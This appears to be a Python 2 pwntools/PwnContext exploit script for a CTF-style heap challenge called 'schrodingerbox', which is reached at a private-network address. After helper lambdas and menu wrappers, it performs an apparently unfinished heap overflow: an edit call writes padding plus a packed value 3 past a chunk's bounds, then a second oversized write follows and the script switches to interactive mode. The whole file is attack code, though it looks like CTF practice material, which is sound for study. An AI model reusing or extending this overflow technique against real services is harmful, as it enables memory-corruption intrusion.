#!/usr/bin/python
#coding=utf-8
from PwnContext import *
from IPython import embed as ipy
context.terminal = ['gnome-terminal','-x','sh','-c']
s       = lambda data               :ctx.send(str(data))
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=False  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)

uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
def lg(s,addr):
    print '\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr)

context.log_level = 'debug'
ctx.binary = './schrodingerbox'
ctx.remote = ('192.168.39.139', 52520)
# ctx.custom_lib_dir = './lib'
# ctx.debug_remote_libc = True
ctx.symbols = {}
ctx.breakpoints = [] 

def add(type):
	sla('5.quit\n','1')
	sla('?\n',type)

def edit(idx,num,msg):
	sla('5.quit\n','2')
	sla('?\n',str(idx))
	sla('?\n',str(num))
	s(msg)

def delete(idx):
	sla('5.quit\n','3')
	sla('?\n',str(idx))

def show(idx):
	sla('5.quit\n','4')
	sla('?\n',str(idx))




rs()
add('small')
add('normal')
edit(0,0x20,'a'*0x18+p64(3)+'\n')

edit(1,0x50,'a'*0x30+'\n')

irt()
